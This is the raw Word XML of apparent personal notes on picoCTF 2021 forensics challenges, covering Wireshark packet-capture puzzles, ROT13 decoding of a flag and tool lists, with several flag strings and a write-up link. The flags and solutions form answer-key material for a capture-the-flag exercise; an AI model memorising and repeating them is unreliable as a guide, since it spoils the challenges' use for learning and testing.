      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E43273">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Author: Dylan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8D2066" w14:textId="77777777" w:rsidR="00E43273" w:rsidRPr="00E43273" w:rsidRDefault="00E43273" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E43273">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A20AF6A" w14:textId="77777777" w:rsidR="00E43273" w:rsidRPr="00E43273" w:rsidRDefault="00E43273" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="033E2142" w14:textId="128C664C" w:rsidR="00E43273" w:rsidRDefault="00E43273" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E43273">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Can you find the flag? shark1.pcapng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F3D2337" w14:textId="577CB1E5" w:rsidR="00DB768B" w:rsidRDefault="00DB768B" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65C191E1" w14:textId="77777777" w:rsidR="00DB768B" w:rsidRDefault="00DB768B" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B4CA577" w14:textId="4E064FF6" w:rsidR="00DB768B" w:rsidRDefault="00DB768B" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minor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6336676F" w14:textId="392AE9B6" w:rsidR="00DB768B" w:rsidRDefault="00DB768B" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E54C388" w14:textId="572BEE32" w:rsidR="00DB768B" w:rsidRDefault="00DB768B" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7CD14C58" wp14:editId="5D74B155">
            <wp:extent cx="4754880" cy="4069080"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="77" name="Picture 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54880" cy="4069080"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B5DCB15" w14:textId="41762DCF" w:rsidR="00DB768B" w:rsidRDefault="00DB768B" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">CP Stream 5  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB768B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>cvpbPGS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB768B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{c33xno00_1_f33_h_qrnqorrs}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="629719BA" wp14:editId="7A58BB0B">
            <wp:extent cx="6332220" cy="4206240"/>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78"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="4206240"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2032BF08" w14:textId="32258203" w:rsidR="00DB768B" w:rsidRDefault="00DB768B" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB768B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>cvpbPGS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB768B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{c33xno00_1_f33_h_qrnqorrs}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> seems ROT13 encryption</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F9849B" w14:textId="11AF365D" w:rsidR="00DB768B" w:rsidRDefault="00DB768B" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">decode it we get flag </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C53760" w14:textId="55A2066C" w:rsidR="00DB768B" w:rsidRDefault="00DB768B" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB768B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB768B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{p33kab00_1_s33_u_deadbeef}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43DD4E60" w14:textId="2463593D" w:rsidR="00E365B3" w:rsidRDefault="00E365B3" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12634911" w14:textId="05F6BDD6" w:rsidR="00E365B3" w:rsidRDefault="00E365B3" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65DD781B" w14:textId="7C559AF1" w:rsidR="00E365B3" w:rsidRDefault="00E365B3" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69DF714B" w14:textId="77777777" w:rsidR="00DC5280" w:rsidRPr="00DC5280" w:rsidRDefault="00DC5280" w:rsidP="00DC5280">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Wireshark </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>twoo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>twooo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> two </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>twoo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0A4CB2" w14:textId="77777777" w:rsidR="00DC5280" w:rsidRPr="00DC5280" w:rsidRDefault="00DC5280" w:rsidP="00DC5280">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722D2B91" w14:textId="77777777" w:rsidR="00DC5280" w:rsidRPr="00DC5280" w:rsidRDefault="00DC5280" w:rsidP="00DC5280">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49ED50E3" w14:textId="77777777" w:rsidR="00DC5280" w:rsidRPr="00DC5280" w:rsidRDefault="00DC5280" w:rsidP="00DC5280">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3044EE01" w14:textId="77777777" w:rsidR="00DC5280" w:rsidRPr="00DC5280" w:rsidRDefault="00DC5280" w:rsidP="00DC5280">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Author: Dylan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6B7886" w14:textId="77777777" w:rsidR="00DC5280" w:rsidRPr="00DC5280" w:rsidRDefault="00DC5280" w:rsidP="00DC5280">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38FB968E" w14:textId="77777777" w:rsidR="00DC5280" w:rsidRPr="00DC5280" w:rsidRDefault="00DC5280" w:rsidP="00DC5280">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26CB9250" w14:textId="77777777" w:rsidR="00DC5280" w:rsidRPr="00DC5280" w:rsidRDefault="00DC5280" w:rsidP="00DC5280">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Can you find the flag? shark2.pcapng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB8E0E6" w14:textId="77777777" w:rsidR="00DC5280" w:rsidRPr="00DC5280" w:rsidRDefault="00DC5280" w:rsidP="00DC5280">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5198CF97" w14:textId="77777777" w:rsidR="00DC5280" w:rsidRPr="00DC5280" w:rsidRDefault="00DC5280" w:rsidP="00DC5280">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>debug info: [u:283398 e: p: c:110 i:502]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E60AD3E" w14:textId="77777777" w:rsidR="00DC5280" w:rsidRPr="00DC5280" w:rsidRDefault="00DC5280" w:rsidP="00DC5280">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Hints</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE3181E" w14:textId="77777777" w:rsidR="00DC5280" w:rsidRPr="00DC5280" w:rsidRDefault="00DC5280" w:rsidP="00DC5280">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B260868" w14:textId="5C20DC49" w:rsidR="00E365B3" w:rsidRDefault="00DC5280" w:rsidP="00DC5280">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC5280">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Look for traffic that seems suspicious.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F65BF11" w14:textId="5360FA24" w:rsidR="00E365B3" w:rsidRDefault="00E365B3" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E365B3">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Wireshark_twoo_twooo_two_twoo.md</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE575C9" w14:textId="3A06745B" w:rsidR="00E365B3" w:rsidRDefault="00E365B3" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E365B3">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E365B3">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{dns_3xf1l_ftw_deadbeef}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24AAA026" w14:textId="2EF6DBFB" w:rsidR="00DC5280" w:rsidRDefault="00DC5280" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F620160" w14:textId="7DDBADDE" w:rsidR="00604D66" w:rsidRDefault="00604D66" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FAA105C" w14:textId="6A429D38" w:rsidR="00604D66" w:rsidRDefault="00604D66" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="419B3CCB" w14:textId="2FD008BB" w:rsidR="00604D66" w:rsidRDefault="00604D66" w:rsidP="00604D66">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Trivial Flag Transfer Protocol</w:t>
      </w:r>
      <w:r w:rsidR="002D6730">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve">    tools: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002D6730">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>whireshark</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002D6730">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve"> ,</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002D6730">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>tshark</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002D6730">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve">,  ROT13, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002D6730">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>steghide</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7B780AC3"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 | 90 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4741E4EF" w14:textId="77777777" w:rsidR="00604D66" w:rsidRDefault="00604D66" w:rsidP="00604D66">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picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2021Forensics</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F875AC" w14:textId="77777777" w:rsidR="00604D66" w:rsidRDefault="00604D66" w:rsidP="00604D66">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DANNY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C720F2" w14:textId="77777777" w:rsidR="00604D66" w:rsidRDefault="00604D66" w:rsidP="00604D66">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5D47DF78" w14:textId="77777777" w:rsidR="00604D66" w:rsidRDefault="00604D66" w:rsidP="00604D66">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Figure out how they moved the </w:t>
      </w:r>
      <w:hyperlink r:id="rId179" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>flag</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D7AD09" w14:textId="77777777" w:rsidR="00604D66" w:rsidRDefault="00604D66" w:rsidP="00604D66">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:eastAsia="Times New Roman" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>Hints </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7715FB66" w14:textId="77777777" w:rsidR="00604D66" w:rsidRDefault="00604D66" w:rsidP="00604D66">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:textAlignment w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215A5CB0" w14:textId="68C02E54" w:rsidR="00604D66" w:rsidRPr="002D6730" w:rsidRDefault="00604D66" w:rsidP="00604D66">
      <w:pPr>
        <w:pStyle w:val="body-sm"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>What are some other ways to hide data?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18965AAB" w14:textId="77777777" w:rsidR="00604D66" w:rsidRDefault="00604D66" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53708C8D" w14:textId="5AEBC85F" w:rsidR="00DC5280" w:rsidRDefault="00604D66" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId180" w:history="1">
        <w:r w:rsidRPr="00F14FBF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
            <w:lang w:val="en-CA"/>
          </w:rPr>
